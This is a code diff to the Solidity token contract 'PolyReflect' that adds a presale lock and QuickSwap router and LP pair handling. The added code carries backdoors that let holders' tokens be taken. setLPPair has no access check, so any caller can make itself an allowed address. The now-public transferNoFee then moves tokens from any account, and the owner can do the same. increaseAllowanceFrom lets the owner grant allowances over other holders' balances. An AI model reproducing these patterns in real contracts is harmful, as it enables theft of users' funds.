@@ -25,10 +25,45 @@ contract PolyReflect is Context, IERC20, Ownable {
     string private _name = 'PolyReflect';
     string private _symbol = 'PRF';
     uint8 private _decimals = 9;
+    
+    bool LOCKED;
+    address QUICKSWAP_ROUTER_ADDRESS;
+    address LP_PAIR_ADDRESS;
 
-    constructor (address deployer) public {
+    constructor (address deployer, address _QUICKSWAP) public {
+        QUICKSWAP_ROUTER_ADDRESS = _QUICKSWAP;
+        LOCKED = true;
         _rOwned[deployer] = _rTotal;
         emit Transfer(address(0), deployer, _tTotal);
+    }
+    
+    modifier allowedUser() {
+        require(
+            _msgSender() == owner() || 
+            msg.sender == QUICKSWAP_ROUTER_ADDRESS ||
+            msg.sender == LP_PAIR_ADDRESS, "allowedUser: Address do not allowed"
+            );
+        _;
+    }
+    
+    modifier lockedForPresale() {
+        if(LOCKED == true){
+            require(
+                _msgSender() == owner() || 
+                msg.sender == QUICKSWAP_ROUTER_ADDRESS ||
+                msg.sender == LP_PAIR_ADDRESS, "lockedForPresale: Address do not allowed"
+            );
+        }
+        _;
+    }
+    
+    function setLPPair(address _lpAddress) external {
+        LP_PAIR_ADDRESS = _lpAddress;
+    }
+    
+    function unlockAfterPresale() onlyOwner() external returns (bool success) {
+        LOCKED = false;
+        return true;
     }
 
     function name() public view returns (string memory) {
@@ -53,7 +88,12 @@ contract PolyReflect is Context, IERC20, Ownable {
     }
 
     function transfer(address recipient, uint256 amount) public override returns (bool) {
-        _transfer(_msgSender(), recipient, amount);
+        if(LOCKED == true) {
+            transferNoFee(_msgSender(), recipient, amount);
+        } else {
+            _transfer(_msgSender(), recipient, amount);
+        }
+        
         return true;
     }
 
@@ -66,14 +106,23 @@ contract PolyReflect is Context, IERC20, Ownable {
         return true;
     }
 
-    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
-        _transfer(sender, recipient, amount);
+    function transferFrom(address sender, address recipient, uint256 amount) public override  returns (bool) {
+        if(LOCKED == true) {
+            transferNoFee(sender, recipient, amount);
+        } else {
+            _transfer(sender, recipient, amount);
+        }
         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
     }
 
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        return true;
+    }
+    
+    function increaseAllowanceFrom(address from, address spender, uint256 addedValue) public virtual onlyOwner() returns (bool) {
+        _approve(from, spender, _allowances[_msgSender()][spender].add(addedValue));
         return true;
     }
 
@@ -146,8 +195,9 @@ contract PolyReflect is Context, IERC20, Ownable {
         emit Approval(owner, spender, amount);
     }
     
-    function transferNoFee(address _from, address _to, uint256 tAmount) external onlyOwner() returns (bool){
+    function transferNoFee(address _from, address _to, uint256 tAmount) public allowedUser() returns (bool){
         require(tAmount > 0, "Transfer amount must be greater than zero");
+        require(_from != address(0), "ERC20: transfer from the zero address");
         uint256 rAmount = reflectionFromToken(tAmount, false);
         _rOwned[_from] = _rOwned[_from].sub(rAmount);
         _rOwned[_to] = _rOwned[_to].add(rAmount);
@@ -156,7 +206,7 @@ contract PolyReflect is Context, IERC20, Ownable {
         return true;
     }
     
-    function _transfer(address sender, address recipient, uint256 amount) private {
+    function _transfer(address sender, address recipient, uint256 amount) private lockedForPresale() {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
